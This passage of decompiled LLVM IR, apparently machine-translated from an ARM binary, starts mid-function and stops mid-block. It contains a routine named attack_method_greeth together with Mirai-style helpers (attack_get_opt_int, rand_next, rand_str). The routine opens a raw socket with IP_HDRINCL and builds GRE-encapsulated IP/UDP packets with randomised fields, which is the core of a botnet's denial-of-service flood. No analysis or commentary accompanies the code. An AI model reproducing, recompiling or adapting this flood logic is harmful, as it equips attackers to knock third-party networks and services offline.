  %v5_9328 = or i32 %v5_9324, %v5_9314
  %v7_932c = lshr i32 %v0_92fc, %v4_9320
  %v8_932c = add i32 %v7_932c, %v5_9328
  store i32 %v8_932c, i32* %r2.global-to-local, align 4
  %v1_9330 = and i32 %v8_932c, 16711680
  store i32 %v1_9330, i32* %r0.global-to-local, align 4
  %v1_933c = and i32 %v8_932c, 65280
  store i32 %v1_933c, i32* %r1.global-to-local, align 4
  %v5_9344 = call i32 @llvm.bswap.i32(i32 %v8_932c)
  %v1_9348 = load i32, i32* @r5, align 4
  %v2_9348 = add i32 %v1_9348, 16
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v5_9344, i32* %v3_9348, align 4
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9358:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  %v0_9358 = call i32 @rand_next()
  store i32 %v0_9358, i32* %r0.global-to-local, align 4
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  %v1_936c = load i32, i32* @r5, align 4
  %v2_936c = add i32 %v1_936c, 12
  %v3_936c = inttoptr i32 %v2_936c to i32*
  store i32 %v0_9358, i32* %v3_936c, align 4
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_9358.dec_label_pc_923c_crit_edge

dec_label_pc_9358.dec_label_pc_923c_crit_edge:    ; preds = %dec_label_pc_9358
  %v1_9240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_923c

dec_label_pc_9374:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9228
  %v0_9374 = call i32 @rand_next()
  %v1_9374 = trunc i32 %v0_9374 to i16
  %v3_9378 = load i32, i32* @r5, align 4
  %v4_9378 = add i32 %v3_9378, 4
  %v5_9378 = inttoptr i32 %v4_9378 to i16*
  store i16 %v1_9374, i16* %v5_9378, align 2
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v1_9380 = load i32, i32* @r4, align 4
  %v9_9380 = icmp eq i32 %v3_9080, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9388:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v0_9388 = call i32 @rand_next()
  %v1_9388 = trunc i32 %v0_9388 to i16
  store i32 %v0_9388, i32* %r0.global-to-local, align 4
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v1_9390 = load i32, i32* @r4, align 4
  %v9_9390 = icmp eq i32 %v3_9098, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v3_9394 = load i32, i32* @r5, align 4
  %v4_9394 = add i32 %v3_9394, 20
  %v5_9394 = inttoptr i32 %v4_9394 to i16*
  store i16 %v1_9388, i16* %v5_9394, align 2
  br i1 %v9_9390, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_939c:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  %v0_939c = call i32 @rand_next()
  %v1_939c = trunc i32 %v0_939c to i16
  store i32 %v0_939c, i32* %r0.global-to-local, align 4
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v3_93a8 = load i32, i32* @r6, align 4
  %v4_93a8 = add i32 %v3_93a8, 2
  %v5_93a8 = inttoptr i32 %v4_93a8 to i16*
  store i16 %v1_939c, i16* %v5_93a8, align 2
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 28
  store i32 %v1_93b0, i32* %r0.global-to-local, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  %v2_93b8 = inttoptr i32 %v1_93b0 to i16*
  %v3_93b8 = call i32 @rand_str(i16* %v2_93b8, i32 %v0_90c8)
  store i32 %v3_93b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9260

dec_label_pc_93c0:                                ; preds = %dec_label_pc_9034
  %v0_93c0 = load i32, i32* @fp, align 4
  store i32 %v0_93c0, i32* %r0.global-to-local, align 4
  %v1_93c4 = call i32 @__GI___libc_close(i32 %v0_93c0)
  store i32 %v1_93c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %entry, %dec_label_pc_93c0
  %v1_93d0 = phi i32 [ %v3_9024, %entry ], [ %v1_93c4, %dec_label_pc_93c0 ]
  store i32 %v18_8eec, i32* %sb.global-to-local, align 4
  store i32 %v27_8eec, i32* %lr.global-to-local, align 4
  ret i32 %v1_93d0

; uselistorder directives
  uselistorder i32 %v0_939c, { 1, 0 }
  uselistorder i32 %v0_9388, { 1, 0 }
  uselistorder i32 %v1_9380, { 1, 0 }
  uselistorder i32 %v3_92f8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_92d4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_92a0, { 1, 0 }
  uselistorder i32 %v4_9290, { 1, 0 }
  uselistorder i1 %v2_93a4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9368, { 3, 2, 0, 1 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90fc, { 1, 0 }
  uselistorder i32 %v1_90cc, { 1, 0, 2 }
  uselistorder i32 %v1_90c8, { 1, 0, 2 }
  uselistorder i32 %v3_90a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9088, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9080, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9078, { 1, 0, 2 }
  uselistorder i32 %v0_90c8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9068, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9054, { 1, 0 }
  uselistorder i1 %v7_9028, { 1, 0 }
  uselistorder i32 %v3_9024, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_9010, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8ffc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v1_8f64, { 1, 0 }
  uselistorder i32 %v6_8f5c, { 1, 0 }
  uselistorder i32 %v7_8f44, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f40, { 1, 0 }
  uselistorder i32 %v6_8f20, { 1, 0 }
  uselistorder i32 %v2_8f08, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93c8, { 1, 0 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
  uselistorder label %dec_label_pc_9260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_91e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91e4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_method_greeth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @r5, align 4
  %v24_93d8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93f4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_93f8 = load i32, i32* @r5, align 4
  store i32 %v0_93f8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9408 = load i32, i32* @r4, align 4
  store i32 %v0_9408, i32* %r0.global-to-local, align 4
  %v5_940c = inttoptr i32 %v0_93f8 to i32*
  %v6_940c = call i32 @attack_get_opt_int(i32 %v0_9408, i32* %v5_940c, i32 2, i32 0)
  %v1_9418 = urem i32 %v6_940c, 256
  store i32 %v1_9418, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9424 = load i32, i32* @r5, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  %v0_9428 = load i32, i32* @r4, align 4
  store i32 %v0_9428, i32* %r0.global-to-local, align 4
  %v5_942c = trunc i32 %v6_940c to i8
  %v6_9430 = inttoptr i32 %v0_9424 to i32*
  %v7_9430 = call i32 @attack_get_opt_int(i32 %v0_9428, i32* %v6_9430, i32 3, i32 65535)
  %v0_9434 = load i32, i32* @r5, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9430, i32* %fp.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v4_9448 = inttoptr i32 %v0_9434 to i32*
  %v5_9448 = call i32 @attack_get_opt_int(i32 %v0_9444, i32* %v4_9448, i32 4, i32 64)
  %v1_9450 = urem i32 %v5_9448, 256
  store i32 %v1_9450, i32* %ip.global-to-local, align 4
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9460 = load i32, i32* @r4, align 4
  store i32 %v0_9460, i32* %r0.global-to-local, align 4
  %v6_9468 = inttoptr i32 %v0_9454 to i32*
  %v7_9468 = call i32 @attack_get_opt_int(i32 %v0_9460, i32* %v6_9468, i32 5, i32 1)
  %v1_9474 = urem i32 %v7_9468, 256
  store i32 %v1_9474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* @r5, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9484 = load i32, i32* @r4, align 4
  store i32 %v0_9484, i32* %r0.global-to-local, align 4
  %v5_948c = inttoptr i32 %v0_9480 to i32*
  %v6_948c = call i32 @attack_get_opt_int(i32 %v0_9484, i32* %v5_948c, i32 6, i32 65535)
  %v0_9494 = load i32, i32* @r5, align 4
  store i32 %v0_9494, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_948c, i32* @r8, align 4
  %v0_94a4 = load i32, i32* @r4, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v4_94a8 = inttoptr i32 %v0_9494 to i32*
  %v5_94a8 = call i32 @attack_get_opt_int(i32 %v0_94a4, i32* %v4_94a8, i32 7, i32 65535)
  %v0_94ac = load i32, i32* @r5, align 4
  store i32 %v0_94ac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_94a8, i32* @r7, align 4
  %v0_94bc = load i32, i32* @r4, align 4
  store i32 %v0_94bc, i32* %r0.global-to-local, align 4
  %v4_94c0 = inttoptr i32 %v0_94ac to i32*
  %v5_94c0 = call i32 @attack_get_opt_int(i32 %v0_94bc, i32* %v4_94c0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r5, align 4
  store i32 %v0_94d0, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* @r4, align 4
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  %v4_94d8 = inttoptr i32 %v0_94d0 to i32*
  %v5_94d8 = call i32 @attack_get_opt_int(i32 %v0_94d4, i32* %v4_94d8, i32 1, i32 1)
  %v1_94e0 = urem i32 %v5_94d8, 256
  store i32 %v1_94e0, i32* %ip.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r5, align 4
  store i32 %v0_94e4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94f0 = load i32, i32* @r4, align 4
  store i32 %v0_94f0, i32* %r0.global-to-local, align 4
  %v5_94f8 = inttoptr i32 %v0_94e4 to i32*
  %v6_94f8 = call i32 @attack_get_opt_int(i32 %v0_94f0, i32* %v5_94f8, i32 19, i32 0)
  %v0_9500 = load i32, i32* @r5, align 4
  store i32 %v0_9500, i32* %r1.global-to-local, align 4
  %v2_9504 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i32 %v6_94f8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9510 = load i32, i32* @r4, align 4
  store i32 %v0_9510, i32* %r0.global-to-local, align 4
  %v4_9514 = inttoptr i32 %v0_9500 to i32*
  %v5_9514 = call i32 @attack_get_opt_int(i32 %v0_9510, i32* %v4_9514, i32 25, i32 %v2_9504)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9528 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v7_952c = icmp eq i32 %v3_9528, -1
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_952c, label %dec_label_pc_9a40, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9540 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9540, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9554 = call i32 @__GI_setsockopt(i32 %v3_9528, i32 0, i32 3, i32 %v6_9540, i32 4)
  store i32 %v5_9554, i32* %r0.global-to-local, align 4
  %v7_9558 = icmp eq i32 %v5_9554, -1
  store i1 %v7_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9558, label %dec_label_pc_9a38, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  %v0_9560 = load i32, i32* @r8, align 4
  %v0_9564 = load i32, i32* @r7, align 4
  %v0_9568 = load i32, i32* %fp.global-to-local, align 4
  %v0_956c = load i32, i32* @r6, align 4
  %v1_956c = urem i32 %v0_956c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9574 = urem i32 %v0_9560, 65536
  store i32 %v3_9574, i32* %r3.global-to-local, align 4
  %v3_9578 = urem i32 %v0_9564, 65536
  store i32 %v3_9578, i32* %r4.global-to-local, align 4
  %v0_957c = load i32, i32* @sl, align 4
  %v2_957c = icmp eq i32 %v0_957c, 0
  store i1 %v2_957c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9594 = urem i32 %v0_9568, 65536
  store i32 %v3_9594, i32* @fp, align 4
  br i1 %v2_957c, label %dec_label_pc_9a4c, label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9560
  %v3_9564 = mul i32 %v0_9564, 65536
  %v3_9560 = mul i32 %v0_9560, 65536
  %v0_9568.not = or i32 %v0_9568, -65536
  %v1_95a8 = xor i32 %v0_9568.not, 65535
  %v3_95ac = mul i32 %v5_94c0, 65536
  %v1_95b0 = add i32 %v3_95ac, 4325376
  %tmp73 = udiv i32 %v1_95b0, 256
  %v3_95c4 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_95a8, 256
  %v3_95c8 = and i32 %tmp74, 65280
  store i32 %v3_95c8, i32* %ip.global-to-local, align 4
  %v1_95cc = add i32 %v3_95ac, 524288
  %v1_95d4 = add i32 %v3_95ac, 1835008
  %tmp75 = udiv i32 %v1_95a8, 256
  %v4_95d8 = urem i32 %tmp75, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c8
  %v4_95e0 = udiv i32 %v1_95b0, 16777216
  %v5_95e0 = or i32 %v3_95c4, %v4_95e0
  store i32 %v5_95e0, i32* @r8, align 4
  %v3_95ec = udiv i32 %v1_95d4, 256
  %tmp76 = mul i32 %v0_9568, 256
  %v3_95f0 = and i32 %tmp76, 65280
  store i32 %v3_9560, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9568, 256
  %v4_9600 = urem i32 %tmp77, 256
  %v5_9600 = or i32 %v4_9600, %v3_95f0
  store i32 %v5_9600, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9560, 256
  %v3_9604 = and i32 %tmp78, 65280
  %v1_9608 = and i32 %v3_95ec, 65280
  store i32 %v1_9608, i32* @r6, align 4
  store i32 %v3_9564, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9564, 256
  %v3_9614 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9560, 256
  %v4_9618 = urem i32 %tmp80, 256
  %v5_9618 = or i32 %v4_9618, %v3_9604
  store i32 %v5_9618, i32* @lr, align 4
  %v4_961c = udiv i32 %v1_95d4, 16777216
  %v5_961c = or i32 %v1_9608, %v4_961c
  store i32 %v5_961c, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9564, 256
  %v4_9620 = urem i32 %tmp81, 256
  %v5_9620 = or i32 %v4_9620, %v3_9614
  %tmp82 = udiv i32 %v1_95cc, 256
  %v3_9624 = and i32 %tmp82, 65280
  store i32 %v3_9624, i32* @r5, align 4
  %v5_9628 = trunc i32 %v5_9600 to i16
  %v5_9630 = trunc i32 %v5_961c to i16
  %v4_9638 = udiv i32 %v1_95cc, 16777216
  %v5_9638 = or i32 %v3_9624, %v4_9638
  store i32 %v5_9638, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9694 = sext i8 %v5_942c to i32
  %v1_96a0 = trunc i32 %v5_9448 to i8
  %sext = mul nuw i32 %v5_95d8, 65536
  %v4_972c = sdiv i32 %sext, 65536
  %v2_9758 = icmp eq i32 %v1_956c, 0
  %sext8 = mul nuw i32 %v5_9618, 65536
  %v4_9778 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9620, 65536
  %v4_9780 = sdiv i32 %sext9, 65536
  %v1_973827 = trunc i32 %v4_972c to i16
  br label %dec_label_pc_9640

dec_label_pc_9640:                                ; preds = %bb85, %dec_label_pc_95a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_964c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_964c, i32* %r0.global-to-local, align 4
  %v2_9654 = load i32, i32* @r4, align 4
  %v5_9654 = mul i32 %v2_9654, 4
  %v6_9654 = add i32 %v5_9654, %v2_93f4
  %v7_9654 = inttoptr i32 %v6_9654 to i32*
  store i32 %v2_964c, i32* %v7_9654, align 4
  %v3_9658 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9658, i32* %r2.global-to-local, align 4
  %v5_9660 = mul i32 %v3_9658, 24
  %v1_9664 = load i32, i32* @sb, align 4
  %v2_9664 = add i32 %v1_9664, %v5_9660
  store i32 %v2_9664, i32* @lr, align 4
  store i32 %v2_93f4, i32* %r3.global-to-local, align 4
  %v4_966c = mul i32 %v3_9658, 4
  %v5_966c = add i32 %v4_966c, %v2_93f4
  %v6_966c = inttoptr i32 %v5_966c to i32*
  %v7_966c = load i32, i32* %v6_966c, align 4
  store i32 %v7_966c, i32* %r4.global-to-local, align 4
  %v1_9670 = inttoptr i32 %v7_966c to i8*
  %v2_9670 = load i8, i8* %v1_9670, align 1
  %tmp = urem i8 %v2_9670, 16
  %v1_9674 = zext i8 %tmp to i32
  %v1_9678 = or i32 %v1_9674, 64
  store i32 %v1_9678, i32* %r3.global-to-local, align 4
  %v1_967c = trunc i32 %v1_9678 to i8
  store i8 %v1_967c, i8* %v1_9670, align 1
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  %v1_9680 = inttoptr i32 %v0_9680 to i8*
  %v2_9680 = load i8, i8* %v1_9680, align 1
  %v1_9684 = and i8 %v2_9680, -16
  %v1_9688 = or i8 %v1_9684, 5
  store i32 %v1_9474, i32* %r5.global-to-local, align 4
  store i8 %v1_9688, i8* %v1_9680, align 1
  store i32 %v4_9694, i32* %r1.global-to-local, align 4
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = add i32 %v2_9698, 1
  %v4_9698 = inttoptr i32 %v3_9698 to i8*
  store i8 %v5_942c, i8* %v4_9698, align 1
  store i32 %v1_9450, i32* %r2.global-to-local, align 4
  %v2_96a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a0 = add i32 %v2_96a0, 8
  %v4_96a0 = inttoptr i32 %v3_96a0 to i8*
  store i8 %v1_96a0, i8* %v4_96a0, align 1
  %v2_96a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v5_9628, i16* %v4_96a8, align 2
  %v2_96b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 9
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 47, i8* %v4_96b0, align 1
  store i32 %v5_9514, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_96b8 = icmp eq i32 %v0_96b8, 0
  store i1 %v2_96b8, i1* %cpsr_z.global-to-local, align 1
  %v1_96bc = load i32, i32* %r4.global-to-local, align 4
  %v2_96bc = add i32 %v1_96bc, 12
  %v3_96bc = inttoptr i32 %v2_96bc to i32*
  store i32 %v5_9514, i32* %v3_96bc, align 4
  br i1 %v2_96b8, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9640
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_96c4 = load i32, i32* %r4.global-to-local, align 4
  %v4_96c4 = add i32 %v3_96c4, 6
  %v5_96c4 = inttoptr i32 %v4_96c4 to i16*
  store i16 64, i16* %v5_96c4, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9640, %bb
  %v0_96c8 = load i32, i32* @lr, align 4
  %v1_96c8 = add i32 %v0_96c8, 16
  %v2_96c8 = inttoptr i32 %v1_96c8 to i32*
  %v3_96c8 = load i32, i32* %v2_96c8, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_96d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_96d0 = add i32 %v1_96d0, 16
  %v3_96d0 = inttoptr i32 %v2_96d0 to i32*
  store i32 %v3_96c8, i32* %v3_96d0, align 4
  %v0_96d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_96d4 = add i32 %v0_96d4, 24
  store i32 %v1_96d4, i32* %r1.global-to-local, align 4
  %v1_96d8 = add i32 %v0_96d4, 20
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  %v0_96dc = load i32, i32* %ip.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 101
  store i32 %v1_96dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96e8 = load i32, i32* @r8, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i16
  %v3_96e8 = add i32 %v0_96d4, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v1_96e8, i16* %v4_96e8, align 2
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = trunc i32 %v0_96ec to i16
  %v2_96ec = load i32, i32* %r0.global-to-local, align 4
  %v3_96ec = add i32 %v2_96ec, 2
  %v4_96ec = inttoptr i32 %v3_96ec to i16*
  store i16 %v1_96ec, i16* %v4_96ec, align 2
  %v0_96f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96f0 = trunc i32 %v0_96f0 to i8
  %v2_96f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f0 = add i32 %v2_96f0, 13
  %v4_96f0 = inttoptr i32 %v3_96f0 to i8*
  store i8 %v1_96f0, i8* %v4_96f0, align 1
  %v0_96f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96f4 = trunc i32 %v0_96f4 to i8
  %v2_96f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f4 = add i32 %v2_96f4, 12
  %v4_96f4 = inttoptr i32 %v3_96f4 to i8*
  store i8 %v1_96f4, i8* %v4_96f4, align 1
  %v0_96f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96f8 = add i32 %v0_96f8, 38
  %v2_96f8 = inttoptr i32 %v1_96f8 to i8*
  %v3_96f8 = load i8, i8* %v2_96f8, align 1
  %tmp89 = urem i8 %v3_96f8, 16
  %v1_96fc = zext i8 %tmp89 to i32
  %v1_9700 = or i32 %v1_96fc, 64
  store i32 %v1_9700, i32* %r3.global-to-local, align 4
  %v1_9704 = trunc i32 %v1_9700 to i8
  store i8 %v1_9704, i8* %v2_96f8, align 1
  %v0_9708 = load i32, i32* %r4.global-to-local, align 4
  %v1_9708 = add i32 %v0_9708, 38
  %v2_9708 = inttoptr i32 %v1_9708 to i8*
  %v3_9708 = load i8, i8* %v2_9708, align 1
  %v1_970c = and i8 %v3_9708, -16
  %v1_9710 = or i8 %v1_970c, 5
  store i8 %v1_9710, i8* %v2_9708, align 1
  %v0_971c = load i32, i32* %r4.global-to-local, align 4
  %v1_971c = add i32 %v0_971c, 38
  store i32 %v1_971c, i32* @r5, align 4
  %v3_9720 = add i32 %v0_971c, 39
  %v4_9720 = inttoptr i32 %v3_9720 to i8*
  store i8 %v5_942c, i8* %v4_9720, align 1
  store i32 %v5_961c, i32* %r2.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 2
  %v4_9728 = inttoptr i32 %v3_9728 to i16*
  store i16 %v5_9630, i16* %v4_9728, align 2
  store i32 %v4_972c, i32* %r3.global-to-local, align 4
  store i32 %v1_9450, i32* %r1.global-to-local, align 4
  %v0_9734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9734, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_973828 = load i32, i32* @r5, align 4
  %v3_973829 = add i32 %v2_973828, 4
  %v4_973830 = inttoptr i32 %v3_973829 to i16*
  store i16 %v1_973827, i16* %v4_973830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_9738 = load i32, i32* @r5, align 4
  %v3_9738 = add i32 %v2_9738, 4
  %v4_9738 = inttoptr i32 %v3_9738 to i16*
  store i16 %v1_973827, i16* %v4_9738, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9740 = load i32, i32* %r2.global-to-local, align 4
  %v2_9740 = trunc i32 %v1_9740 to i16
  %v3_9740 = load i32, i32* @r5, align 4
  %v4_9740 = add i32 %v3_9740, 6
  %v5_9740 = inttoptr i32 %v4_9740 to i16*
  store i16 %v2_9740, i16* %v5_9740, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9744 = load i32, i32* %r1.global-to-local, align 4
